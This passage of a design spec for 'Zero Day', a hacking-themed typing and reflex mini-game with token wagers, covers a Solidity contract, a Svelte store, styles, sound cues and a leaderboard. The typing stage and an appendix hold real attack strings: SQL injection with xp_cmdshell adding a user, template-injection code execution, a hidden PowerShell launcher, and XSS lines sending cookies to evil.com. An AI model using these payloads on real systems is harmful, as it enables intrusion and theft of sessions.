            msg.sender,
            block.timestamp,
            block.prevrandao,
            totalAttempts
        ));
        
        activeChains[msg.sender] = ExploitChain({
            player: msg.sender,
            difficulty: difficulty,
            state: ChainState.IN_PROGRESS,
            currentStage: 0,
            totalStages: config.stageCount,
            entryAmount: ENTRY_FEE,
            startTime: block.timestamp,
            lastStageTime: block.timestamp,
            sessionHash: sessionHash
        });
        
        emit ChainStarted(msg.sender, difficulty, sessionHash, block.timestamp);
    }
    
    /// @notice Submit proof of stage completion
    /// @param stageProof Cryptographic proof from game server
    function completeStage(bytes calldata stageProof) external nonReentrant {
        ExploitChain storage chain = activeChains[msg.sender];
        
        if (chain.state != ChainState.IN_PROGRESS) revert NoActiveChain();
        if (block.timestamp > chain.lastStageTime + MAX_STAGE_DURATION) {
            _failChain(msg.sender);
            revert StageTimeout();
        }
        
        // Verify stage completion proof (simplified - real impl uses signature)
        if (!_verifyStageProof(chain, stageProof)) {
            revert InvalidStageProof();
        }
        
        chain.currentStage++;
        chain.lastStageTime = block.timestamp;
        
        DifficultyConfig storage config = difficultyConfigs[chain.difficulty];
        uint16 currentMultiplier = config.stageMultipliers[chain.currentStage - 1];
        
        emit StageCompleted(
            msg.sender,
            chain.currentStage,
            currentMultiplier,
            block.timestamp
        );
        
        // Check if chain is complete
        if (chain.currentStage >= chain.totalStages) {
            _completeChain(msg.sender);
        }
    }
    
    /// @notice Abort the chain early and extract current multiplier
    function abortChain() external nonReentrant {
        ExploitChain storage chain = activeChains[msg.sender];
        
        if (chain.state != ChainState.IN_PROGRESS) revert NoActiveChain();
        if (chain.currentStage == 0) {
            // Cannot abort before completing first stage
            _failChain(msg.sender);
            return;
        }
        
        DifficultyConfig storage config = difficultyConfigs[chain.difficulty];
        uint16 multiplierBps = config.stageMultipliers[chain.currentStage - 1];
        uint256 payout = (chain.entryAmount * multiplierBps) / 100;
        
        if (dataToken.balanceOf(address(this)) < payout) {
            revert InsufficientReserve();
        }
        
        chain.state = ChainState.ABORTED;
        totalPaidOut += payout;
        
        dataToken.safeTransfer(msg.sender, payout);
        
        emit ChainAborted(msg.sender, chain.currentStage, multiplierBps, payout);
    }
    
    /// @notice Report a failed stage (called by game server)
    /// @param player The player who failed
    function reportFailure(address player) external onlyOwner {
        _failChain(player);
    }

    // ═══════════════════════════════════════════════════════════════
    // INTERNAL FUNCTIONS
    // ═══════════════════════════════════════════════════════════════

    function _completeChain(address player) internal {
        ExploitChain storage chain = activeChains[player];
        DifficultyConfig storage config = difficultyConfigs[chain.difficulty];
        
        uint16 finalMultiplier = config.maxMultiplierBps;
        uint256 payout = (chain.entryAmount * finalMultiplier) / 100;
        uint256 totalTime = block.timestamp - chain.startTime;
        
        if (dataToken.balanceOf(address(this)) < payout) {
            revert InsufficientReserve();
        }
        
        chain.state = ChainState.COMPLETED;
        totalPaidOut += payout;
        totalCompletions++;
        
        dataToken.safeTransfer(player, payout);
        
        emit ChainCompleted(
            player,
            chain.difficulty,
            finalMultiplier,
            payout,
            totalTime
        );
    }
    
    function _failChain(address player) internal {
        ExploitChain storage chain = activeChains[player];
        
        chain.state = ChainState.FAILED;
        
        emit ChainFailed(player, chain.currentStage, chain.difficulty);
    }
    
    function _verifyStageProof(
        ExploitChain storage chain,
        bytes calldata proof
    ) internal view returns (bool) {
        // Simplified verification - real implementation would verify
        // a signature from the game server attesting to stage completion
        // 
        // Expected proof format:
        // - bytes32 sessionHash
        // - uint8 stageNumber
        // - uint256 completionTime
        // - bytes signature (from game server)
        
        if (proof.length < 73) return false;
        
        bytes32 proofSessionHash = bytes32(proof[0:32]);
        uint8 proofStage = uint8(proof[32]);
        
        return proofSessionHash == chain.sessionHash &&
               proofStage == chain.currentStage + 1;
    }

    // ═══════════════════════════════════════════════════════════════
    // VIEW FUNCTIONS
    // ═══════════════════════════════════════════════════════════════

    /// @notice Get current multiplier for a player's active chain
    function getCurrentMultiplier(address player) external view returns (uint16) {
        ExploitChain storage chain = activeChains[player];
        
        if (chain.state != ChainState.IN_PROGRESS || chain.currentStage == 0) {
            return 0;
        }
        
        DifficultyConfig storage config = difficultyConfigs[chain.difficulty];
        return config.stageMultipliers[chain.currentStage - 1];
    }
    
    /// @notice Get potential payout if player aborts now
    function getPotentialPayout(address player) external view returns (uint256) {
        ExploitChain storage chain = activeChains[player];
        
        if (chain.state != ChainState.IN_PROGRESS || chain.currentStage == 0) {
            return 0;
        }
        
        DifficultyConfig storage config = difficultyConfigs[chain.difficulty];
        uint16 multiplierBps = config.stageMultipliers[chain.currentStage - 1];
        
        return (chain.entryAmount * multiplierBps) / 100;
    }
    
    /// @notice Get game statistics
    function getStats() external view returns (
        uint256 burned,
        uint256 paidOut,
        uint256 attempts,
        uint256 completions
    ) {
        return (totalBurned, totalPaidOut, totalAttempts, totalCompletions);
    }

    // ═══════════════════════════════════════════════════════════════
    // ADMIN FUNCTIONS
    // ═══════════════════════════════════════════════════════════════

    /// @notice Fund the contract reserve for payouts
    function fundReserve(uint256 amount) external {
        dataToken.safeTransferFrom(msg.sender, address(this), amount);
    }
    
    /// @notice Withdraw excess reserve (emergency only)
    function withdrawReserve(uint256 amount) external onlyOwner {
        dataToken.safeTransfer(owner(), amount);
    }
}
```

### Frontend Store

```typescript
// src/lib/features/arcade/zero-day/store.svelte.ts

import { browser } from '$app/environment';

// ═══════════════════════════════════════════════════════════════
// TYPES
// ═══════════════════════════════════════════════════════════════

export type Difficulty = 'SCRIPT_KIDDIE' | 'GREY_HAT' | 'BLACK_HAT';
export type ChainState = 'INACTIVE' | 'IN_PROGRESS' | 'COMPLETED' | 'FAILED' | 'ABORTED';
export type StageType = 'INJECTION' | 'CRACK' | 'MEMORY' | 'BYPASS' | 'EXFILTRATE' | 'EXTRACT';
export type StageState = 'PENDING' | 'BRIEFING' | 'ACTIVE' | 'COMPLETED' | 'FAILED';

interface StageConfig {
  type: StageType;
  name: string;
  description: string;
  duration: number;  // max seconds
  params: Record<string, unknown>;
}

interface DifficultyConfig {
  stages: StageConfig[];
  multipliers: number[];  // After each stage completion
  maxMultiplier: number;
}

interface ExploitChain {
  difficulty: Difficulty;
  state: ChainState;
  currentStage: number;
  totalStages: number;
  entryAmount: bigint;
  startTime: number;
  sessionHash: string;
}

interface StageResult {
  stage: number;
  type: StageType;
  success: boolean;
  timeMs: number;
  score: number;
  details: Record<string, unknown>;
}

interface RecentAttempt {
  address: string;
  difficulty: Difficulty;
  result: 'COMPLETED' | 'FAILED' | 'ABORTED';
  stage: number;
  multiplier: number;
  payout: bigint;
  timestamp: number;
}

// ═══════════════════════════════════════════════════════════════
// CONFIGS
// ═══════════════════════════════════════════════════════════════

const DIFFICULTY_CONFIGS: Record<Difficulty, DifficultyConfig> = {
  SCRIPT_KIDDIE: {
    stages: [
      { type: 'INJECTION', name: 'Code Injection', description: 'Type the payload', duration: 30, params: { length: 40, detectionRate: 0.02 } },
      { type: 'CRACK', name: 'Encryption Crack', description: 'Click weak points', duration: 20, params: { nodes: 8, window: 1.5, maxMisses: 3 } },
      { type: 'MEMORY', name: 'Memory Dump', description: 'Memorize sequence', duration: 25, params: { length: 6, viewTime: 5, attempts: 3 } },
      { type: 'BYPASS', name: 'Firewall Bypass', description: 'Match patterns', duration: 35, params: { patterns: 10, speed: 3, maxErrors: 4 } },
    ],
    multipliers: [1.0, 1.4, 1.8, 2.5],
    maxMultiplier: 2.5,
  },
  GREY_HAT: {
    stages: [
      { type: 'INJECTION', name: 'Code Injection', description: 'Type the payload', duration: 25, params: { length: 70, detectionRate: 0.03 } },
      { type: 'CRACK', name: 'Encryption Crack', description: 'Click weak points', duration: 20, params: { nodes: 12, window: 1.0, maxMisses: 3 } },
      { type: 'MEMORY', name: 'Memory Dump', description: 'Memorize sequence', duration: 20, params: { length: 8, viewTime: 4, attempts: 2 } },
      { type: 'BYPASS', name: 'Firewall Bypass', description: 'Match patterns', duration: 35, params: { patterns: 15, speed: 2, maxErrors: 3 } },
      { type: 'EXFILTRATE', name: 'Data Exfiltration', description: 'Sort packets', duration: 40, params: { packets: 20, time: 2.0, maxErrors: 3 } },
    ],
    multipliers: [1.2, 1.6, 2.2, 3.0, 4.0],
    maxMultiplier: 4.0,
  },
  BLACK_HAT: {
    stages: [
      { type: 'INJECTION', name: 'Code Injection', description: 'Type the payload', duration: 20, params: { length: 100, detectionRate: 0.04 } },
      { type: 'CRACK', name: 'Encryption Crack', description: 'Click weak points', duration: 18, params: { nodes: 16, window: 0.7, maxMisses: 2 } },
      { type: 'MEMORY', name: 'Memory Dump', description: 'Memorize sequence', duration: 18, params: { length: 10, viewTime: 3, attempts: 2 } },
      { type: 'BYPASS', name: 'Firewall Bypass', description: 'Match patterns', duration: 30, params: { patterns: 20, speed: 1.5, maxErrors: 3 } },
      { type: 'EXFILTRATE', name: 'Data Exfiltration', description: 'Sort packets', duration: 35, params: { packets: 25, time: 1.5, maxErrors: 3 } },
      { type: 'EXTRACT', name: 'Critical Extraction', description: 'Multi-task finale', duration: 45, params: { typeLength: 80, alertInterval: 2, seqLength: 6 } },
    ],
    multipliers: [1.5, 2.0, 2.8, 4.0, 5.5, 8.0],
    maxMultiplier: 8.0,
  },
};

const ENTRY_FEE = 100n * 10n ** 18n;  // 100 $DATA

// ═══════════════════════════════════════════════════════════════
// STORE
// ═══════════════════════════════════════════════════════════════

export function createZeroDayStore() {
  // ─────────────────────────────────────────────────────────────
  // STATE
  // ─────────────────────────────────────────────────────────────
  
  let chain = $state<ExploitChain | null>(null);
  let stageState = $state<StageState>('PENDING');
  let stageResults = $state<StageResult[]>([]);
  let recentAttempts = $state<RecentAttempt[]>([]);
  let isLoading = $state(false);
  let error = $state<string | null>(null);
  
  // Current stage game state (varies by stage type)
  let stageGameState = $state<Record<string, unknown>>({});
  
  // ─────────────────────────────────────────────────────────────
  // DERIVED
  // ─────────────────────────────────────────────────────────────
  
  let config = $derived(
    chain ? DIFFICULTY_CONFIGS[chain.difficulty] : null
  );
  
  let currentStageConfig = $derived(
    config && chain ? config.stages[chain.currentStage] : null
  );
  
  let currentMultiplier = $derived(
    config && chain && chain.currentStage > 0
      ? config.multipliers[chain.currentStage - 1]
      : 0
  );
  
  let potentialPayout = $derived(
    chain && currentMultiplier > 0
      ? BigInt(Math.floor(Number(chain.entryAmount) * currentMultiplier))
      : 0n
  );
  
  let nextMultiplier = $derived(
    config && chain && chain.currentStage < config.stages.length
      ? config.multipliers[chain.currentStage]
      : null
  );
  
  let canAbort = $derived(
    chain?.state === 'IN_PROGRESS' && 
    chain.currentStage > 0 &&
    stageState !== 'ACTIVE'
  );
  
  let chainProgress = $derived(
    config && chain
      ? config.stages.map((stage, i) => ({
          ...stage,
          status: i < chain.currentStage ? 'COMPLETED' as const :
                  i === chain.currentStage ? 'CURRENT' as const : 'PENDING' as const,
          multiplier: config.multipliers[i],
        }))
      : []
  );

  // ─────────────────────────────────────────────────────────────
  // ACTIONS
  // ─────────────────────────────────────────────────────────────
  
  async function startChain(difficulty: Difficulty) {
    if (chain?.state === 'IN_PROGRESS') {
      error = 'Chain already in progress';
      return;
    }
    
    isLoading = true;
    error = null;
    
    try {
      // Contract interaction would go here
      // await contract.startChain(difficulty);
      
      const diffConfig = DIFFICULTY_CONFIGS[difficulty];
      
      chain = {
        difficulty,
        state: 'IN_PROGRESS',
        currentStage: 0,
        totalStages: diffConfig.stages.length,
        entryAmount: ENTRY_FEE,
        startTime: Date.now(),
        sessionHash: generateSessionHash(),
      };
      
      stageResults = [];
      stageState = 'BRIEFING';
      
    } catch (e) {
      error = e instanceof Error ? e.message : 'Failed to start chain';
    } finally {
      isLoading = false;
    }
  }
  
  function startStage() {
    if (!chain || stageState !== 'BRIEFING') return;
    
    stageState = 'ACTIVE';
    stageGameState = initializeStageState(currentStageConfig!);
  }
  
  async function completeStage(result: StageResult) {
    if (!chain || stageState !== 'ACTIVE') return;
    
    stageResults = [...stageResults, result];
    
    if (result.success) {
      // Contract interaction for proof submission
      // await contract.completeStage(proof);
      
      chain = {
        ...chain,
        currentStage: chain.currentStage + 1,
      };
      
      if (chain.currentStage >= chain.totalStages) {
        // Chain complete!
        chain = { ...chain, state: 'COMPLETED' };
        stageState = 'COMPLETED';
        
        addRecentAttempt({
          address: '0x...', // Current user
          difficulty: chain.difficulty,
          result: 'COMPLETED',
          stage: chain.totalStages,
          multiplier: config!.maxMultiplier,
          payout: BigInt(Math.floor(Number(chain.entryAmount) * config!.maxMultiplier)),
          timestamp: Date.now(),
        });
      } else {
        // Move to next stage briefing
        stageState = 'BRIEFING';
        stageGameState = {};
      }
    } else {
      // Stage failed
      chain = { ...chain, state: 'FAILED' };
      stageState = 'FAILED';
      
      addRecentAttempt({
        address: '0x...',
        difficulty: chain.difficulty,
        result: 'FAILED',
        stage: chain.currentStage,
        multiplier: currentMultiplier,
        payout: 0n,
        timestamp: Date.now(),
      });
    }
  }
  
  async function abortChain() {
    if (!canAbort || !chain) return;
    
    isLoading = true;
    
    try {
      // Contract interaction
      // await contract.abortChain();
      
      const payout = potentialPayout;
      
      chain = { ...chain, state: 'ABORTED' };
      stageState = 'COMPLETED';
      
      addRecentAttempt({
        address: '0x...',
        difficulty: chain.difficulty,
        result: 'ABORTED',
        stage: chain.currentStage,
        multiplier: currentMultiplier,
        payout,
        timestamp: Date.now(),
      });
      
    } catch (e) {
      error = e instanceof Error ? e.message : 'Failed to abort';
    } finally {
      isLoading = false;
    }
  }
  
  function reset() {
    chain = null;
    stageState = 'PENDING';
    stageResults = [];
    stageGameState = {};
    error = null;
  }
  
  function updateStageGameState(updates: Partial<Record<string, unknown>>) {
    stageGameState = { ...stageGameState, ...updates };
  }
  
  // ─────────────────────────────────────────────────────────────
  // HELPERS
  // ─────────────────────────────────────────────────────────────
  
  function generateSessionHash(): string {
    const array = new Uint8Array(32);
    if (browser) {
      crypto.getRandomValues(array);
    }
    return '0x' + Array.from(array).map(b => b.toString(16).padStart(2, '0')).join('');
  }
  
  function initializeStageState(stage: StageConfig): Record<string, unknown> {
    switch (stage.type) {
      case 'INJECTION':
        return {
          payload: generatePayload(stage.params.length as number),
          typed: '',
          detection: 0,
          errors: 0,
          startTime: Date.now(),
        };
      case 'CRACK':
        return {
          nodes: generateNodes(stage.params.nodes as number),
          hits: 0,
          misses: 0,
          activeNode: null,
          startTime: Date.now(),
        };
      case 'MEMORY':
        return {
          sequence: generateSequence(stage.params.length as number),
          phase: 'memorize', // 'memorize' | 'input'
          input: '',
          attempts: 0,
          startTime: Date.now(),
        };
      case 'BYPASS':
        return {
          patterns: generatePatterns(stage.params.patterns as number),
          currentIndex: 0,
          matched: 0,
          errors: 0,
          startTime: Date.now(),
        };
      case 'EXFILTRATE':
        return {
          packets: generatePackets(stage.params.packets as number),
          currentIndex: 0,
          sorted: 0,
          expired: 0,
          wrong: 0,
          startTime: Date.now(),
        };
      case 'EXTRACT':
        return {
          typePayload: generatePayload(stage.params.typeLength as number),
          typed: '',
          sequence: generateSequence(stage.params.seqLength as number),
          sequencePhase: 'memorize',
          sequenceInput: '',
          alerts: [],
          integrity: 100,
          startTime: Date.now(),
        };
      default:
        return { startTime: Date.now() };
    }
  }
  
  function generatePayload(length: number): string {
    const payloads = [
      "' OR '1'='1' --; DROP TABLE users; SELECT * FROM credentials WHERE id=",
      "admin'; EXEC xp_cmdshell('net user hacker P@ss123 /add'); --",
      "{{constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')}}",
      "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ];
    const base = payloads[Math.floor(Math.random() * payloads.length)];
    return base.substring(0, length).padEnd(length, 'x');
  }
  
  function generateNodes(count: number): Array<{ id: number; x: number; y: number }> {
    return Array.from({ length: count }, (_, i) => ({
      id: i,
      x: Math.random() * 80 + 10,  // 10-90%
      y: Math.random() * 80 + 10,
    }));
  }
  
  function generateSequence(length: number): string {
    const chars = '0123456789ABCDEF';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  }
  
  function generatePatterns(count: number): Array<{ pattern: number[][]; answer: number }> {
    return Array.from({ length: count }, () => {
      const pattern = [
        [Math.random() > 0.5 ? 1 : 0, Math.random() > 0.5 ? 1 : 0],
        [Math.random() > 0.5 ? 1 : 0, Math.random() > 0.5 ? 1 : 0],
      ];
      return { pattern, answer: Math.floor(Math.random() * 4) + 1 };
    });
  }
  
  function generatePackets(count: number): Array<{ type: string; category: number }> {
    const types = [
      { type: 'CREDENTIAL', category: 1 },
      { type: 'SSH_KEY', category: 2 },
      { type: 'API_KEY', category: 2 },
      { type: 'ACCESS_LOG', category: 3 },
      { type: 'ERROR_LOG', category: 3 },
      { type: 'JUNK_DATA', category: 4 },
      { type: 'DECOY', category: 4 },
    ];
    return Array.from({ length: count }, () => types[Math.floor(Math.random() * types.length)]);
  }
  
  function addRecentAttempt(attempt: RecentAttempt) {
    recentAttempts = [attempt, ...recentAttempts.slice(0, 9)];
  }

  // ─────────────────────────────────────────────────────────────
  // RETURN
  // ─────────────────────────────────────────────────────────────
  
  return {
    // State
    get chain() { return chain; },
    get stageState() { return stageState; },
    get stageResults() { return stageResults; },
    get recentAttempts() { return recentAttempts; },
    get isLoading() { return isLoading; },
    get error() { return error; },
    get stageGameState() { return stageGameState; },
    
    // Derived
    get config() { return config; },
    get currentStageConfig() { return currentStageConfig; },
    get currentMultiplier() { return currentMultiplier; },
    get potentialPayout() { return potentialPayout; },
    get nextMultiplier() { return nextMultiplier; },
    get canAbort() { return canAbort; },
    get chainProgress() { return chainProgress; },
    
    // Constants
    ENTRY_FEE,
    DIFFICULTY_CONFIGS,
    
    // Actions
    startChain,
    startStage,
    completeStage,
    abortChain,
    reset,
    updateStageGameState,
  };
}

// ═══════════════════════════════════════════════════════════════
// STAGE-SPECIFIC STORES
// ═══════════════════════════════════════════════════════════════

export function createInjectionStageStore(
  gameState: Record<string, unknown>,
  onUpdate: (updates: Partial<Record<string, unknown>>) => void,
  onComplete: (result: StageResult) => void,
  params: { length: number; detectionRate: number }
) {
  let animationFrame: number | null = null;
  
  function start() {
    if (!browser) return;
    
    function tick() {
      const state = gameState;
      const elapsed = (Date.now() - (state.startTime as number)) / 1000;
      const baseDetection = elapsed * params.detectionRate;
      const errorPenalty = (state.errors as number) * 0.05;
      const newDetection = Math.min(100, (baseDetection + errorPenalty) * 100);
      
      onUpdate({ detection: newDetection });
      
      if (newDetection >= 100) {
        // Failed - detected!
        stop();
        onComplete({
          stage: 0,
          type: 'INJECTION',
          success: false,
          timeMs: Date.now() - (state.startTime as number),
          score: 0,
          details: { reason: 'Detected by firewall' },
        });
        return;
      }
      
      if ((state.typed as string).length >= params.length) {
        // Success!
        stop();
        const payload = state.payload as string;
        const typed = state.typed as string;
        const accuracy = calculateAccuracy(payload, typed);
        
        onComplete({
          stage: 0,
          type: 'INJECTION',
          success: accuracy >= 90,  // Need 90% accuracy
          timeMs: Date.now() - (state.startTime as number),
          score: Math.floor(accuracy * 10),
          details: { accuracy, wpm: calculateWPM(typed, state.startTime as number) },
        });
        return;
      }
      
      animationFrame = requestAnimationFrame(tick);
    }
    
    animationFrame = requestAnimationFrame(tick);
  }
  
  function handleKeypress(key: string) {
    const state = gameState;
    const payload = state.payload as string;
    const typed = state.typed as string;
    
    if (key === 'Backspace') {
      onUpdate({ typed: typed.slice(0, -1) });
      return;
    }
    
    if (key.length === 1) {
      const newTyped = typed + key;
      const expectedChar = payload[typed.length];
      
      if (key !== expectedChar) {
        onUpdate({ 
          typed: newTyped,
          errors: (state.errors as number) + 1,
        });
      } else {
        onUpdate({ typed: newTyped });
      }
    }
  }
  
  function stop() {
    if (animationFrame) {
      cancelAnimationFrame(animationFrame);
      animationFrame = null;
    }
  }
  
  function calculateAccuracy(payload: string, typed: string): number {
    let correct = 0;
    for (let i = 0; i < Math.min(payload.length, typed.length); i++) {
      if (payload[i] === typed[i]) correct++;
    }
    return (correct / payload.length) * 100;
  }
  
  function calculateWPM(typed: string, startTime: number): number {
    const minutes = (Date.now() - startTime) / 60000;
    const words = typed.length / 5;  // Standard: 5 chars = 1 word
    return Math.round(words / minutes);
  }
  
  return {
    start,
    stop,
    handleKeypress,
  };
}

// Similar stores would be created for:
// - createCrackStageStore
// - createMemoryStageStore
// - createBypassStageStore
// - createExfiltrateStageStore
// - createExtractStageStore
```

---

## Visual Design

### Color Scheme

```css
.zero-day {
  /* Base */
  --zd-bg: #0a0a0a;
  --zd-text: #00ff00;
  --zd-text-dim: #007700;
  --zd-border: #00aa00;
  
  /* Stage Status */
  --zd-pending: #444444;
  --zd-active: #00ffff;
  --zd-complete: #00ff00;
  --zd-failed: #ff0000;
  
  /* Multiplier Colors */
  --zd-mult-low: #00ff00;     /* 1.0-2.0x */
  --zd-mult-mid: #ffff00;     /* 2.0-4.0x */
  --zd-mult-high: #ff8800;    /* 4.0-6.0x */
  --zd-mult-max: #ff0000;     /* 6.0-8.0x */
  
  /* Difficulty */
  --zd-script-kiddie: #00ff00;
  --zd-grey-hat: #ffff00;
  --zd-black-hat: #ff0000;
  
  /* Stage Types */
  --zd-injection: #00ff00;
  --zd-crack: #00ffff;
  --zd-memory: #ff00ff;
  --zd-bypass: #ffff00;
  --zd-exfiltrate: #ff8800;
  --zd-extract: #ff0000;
}
```

### Animations

**Chain Progress Animation:**
```css
@keyframes stage-complete {
  0% { transform: scale(1); background: var(--zd-active); }
  50% { transform: scale(1.2); background: var(--zd-complete); box-shadow: 0 0 20px var(--zd-complete); }
  100% { transform: scale(1); background: var(--zd-complete); }
}

@keyframes stage-fail {
  0% { transform: translateX(0); }
  20% { transform: translateX(-10px); }
  40% { transform: translateX(10px); }
  60% { transform: translateX(-5px); }
  80% { transform: translateX(5px); }
  100% { transform: translateX(0); background: var(--zd-failed); }
}
```

**Multiplier Pulse:**
```css
@keyframes multiplier-increase {
  0% { transform: scale(1); }
  50% { transform: scale(1.3); text-shadow: 0 0 20px currentColor; }
  100% { transform: scale(1); }
}
```

**Detection Rising:**
```css
@keyframes detection-warning {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.5; }
}

.detection-bar.critical {
  animation: detection-warning 0.5s infinite;
  background: var(--zd-failed);
}
```

---

## Sound Design

| Event | Sound Description |
|-------|-------------------|
| Chain Start | Low boot-up sequence, system initializing |
| Stage Briefing | Tactical briefing tone, data loading |
| Stage Start | Countdown beeps, "Go" confirmation |
| Typing Correct | Soft keystroke click |
| Typing Error | Sharp buzz, static burst |
| Node Hit | Sharp ping, glass break |
| Node Miss | Error tone, system protest |
| Memory Show | Data stream sound |
| Memory Input | Keypad beeps |
| Pattern Match | Lock unlocking, tumbler click |
| Pattern Wrong | Access denied buzz |
| Packet Sort | Whoosh, data transfer |
| Packet Expire | Fizzle, lost connection |
| Stage Complete | Level-up chime, system unlock |
| Abort Confirm | Emergency extraction sound |
| Chain Complete | Triumphant hack completion fanfare |
| Chain Fail | System lockout, alarms, flatline |
| Multiplier Up | Cash register + power surge |

---

## Feed Integration

```
> 0x7a3f completed BLACK HAT Zero Day chain @ 8.0x [+700 $DATA] 💀
> 0x9c2d failed Zero Day at Stage 5: EXFILTRATION - so close! 
> 0x3b1a aborted GREY HAT chain @ 3.0x [+200 $DATA] - smart play
> 🔥 ZERO DAY: 0x8f2e cleared BLACK HAT in 2:12 - new record! 🔥
> 0x4d5e failed Zero Day MEMORY stage - 8/10 chars ain't enough
> 0x1a2b started BLACK HAT Zero Day chain - good luck hacker 🎯
```

---

## Leaderboard Integration

### Weekly Rankings

```
╔══════════════════════════════════════════════════════════════════╗
║                    ZERO DAY LEADERBOARD                           ║
║                       This Week                                   ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  RANK  HACKER       DIFFICULTY    TIME        COMPLETIONS        ║
║  ─────────────────────────────────────────────────────────────── ║
║  #1    0x7a3f...    BLACK HAT     2:12.34     7                  ║
║  #2    0x9c2d...    BLACK HAT     2:28.91     5                  ║
║  #3    0x3b1a...    BLACK HAT     2:45.12     4                  ║
║  #4    0x8f2e...    GREY HAT      1:34.56     12                 ║
║  #5    0x4d5e...    GREY HAT      1:41.23     11                 ║
║  ...                                                              ║
║  #47   YOU          SCRIPT KIDDIE 1:02.45     3                  ║
║                                                                   ║
║  ─────────────────────────────────────────────────────────────── ║
║  WEEKLY PRIZES: #1: 500 $DATA | #2-3: 250 $DATA | #4-10: 100     ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

### Ranking Criteria

1. **Primary**: Highest difficulty completed
2. **Secondary**: Fastest total completion time
3. **Tertiary**: Number of completions

---

## Testing Checklist

### Contract Tests

- [ ] Entry fee correctly burned on chain start
- [ ] Cannot start chain while one is active
- [ ] Stage completion updates multiplier correctly
- [ ] Abort returns correct payout based on current stage
- [ ] Cannot abort before completing first stage
- [ ] Chain auto-fails if stage takes too long
- [ ] Proof verification works correctly
- [ ] Reserve funding and withdrawal works
- [ ] Events emitted correctly
- [ ] ReentrancyGuard prevents attacks

### Frontend Tests

- [ ] Difficulty selection UI works
- [ ] Chain progress visualization updates
- [ ] Stage briefing displays correctly
- [ ] All 6 stage types function properly:
  - [ ] Injection: typing, detection meter, error tracking
  - [ ] Crack: node appearance, hit detection, miss tracking
  - [ ] Memory: sequence display, hide timing, input validation
  - [ ] Bypass: pattern generation, matching, speed scaling
  - [ ] Exfiltrate: packet generation, sorting, expiration
  - [ ] Extract: multi-task coordination
- [ ] Abort confirmation works
- [ ] Results screen shows correct data
- [ ] Recent attempts updates in real-time
- [ ] Leaderboard displays correctly
- [ ] Mobile touch support for all stages
- [ ] Sound effects sync with events
- [ ] Animations smooth at 60fps
- [ ] Error states handled gracefully

### Integration Tests

- [ ] Contract ↔ Frontend state sync
- [ ] Stage proof generation and verification
- [ ] Payout calculations match contract
- [ ] Feed events generated correctly
- [ ] Leaderboard updates after completions

### Performance Tests

- [ ] Stage transitions under 100ms
- [ ] No frame drops during gameplay
- [ ] Memory cleanup after chain ends
- [ ] Handles rapid input correctly

---

## Appendix: Payload Examples

### Injection Payloads (by difficulty)

**SCRIPT KIDDIE (40 chars):**
```
' OR '1'='1' --; SELECT * FROM users;
admin' OR '1'='1'/*bypass auth check*/
```

**GREY HAT (70 chars):**
```
'; EXEC xp_cmdshell('net user hacker P@ss123 /add'); DROP TABLE audit;--
{{7*7}}{{constructor.constructor('return process')().exit()}}/*RCE*/
```

**BLACK HAT (100 chars):**
```
'; DECLARE @x VARCHAR(8000); SET @x='powershell -nop -w hidden -ep bypass -enc <base64>'; EXEC(@x);--
<img src=x onerror="fetch('https://evil.com/steal?c='+btoa(document.cookie))"><!--XSS payload-->
```

---

## Appendix: Stage Difficulty Scaling

| Stage | Script Kiddie | Grey Hat | Black Hat |
|-------|---------------|----------|-----------|
| **INJECTION** | 40 chars, slow detect | 70 chars, medium detect | 100 chars, fast detect |
| **CRACK** | 8 nodes, 1.5s window | 12 nodes, 1.0s window | 16 nodes, 0.7s window |
| **MEMORY** | 6 chars, 5s view | 8 chars, 4s view | 10 chars, 3s view |
| **BYPASS** | 10 patterns, 3s each | 15 patterns, 2s each | 20 patterns, 1.5s each |
| **EXFILTRATE** | 15 packets, 2.5s each | 20 packets, 2.0s each | 25 packets, 1.5s each |
| **EXTRACT** | N/A | N/A | Multi-task boss |
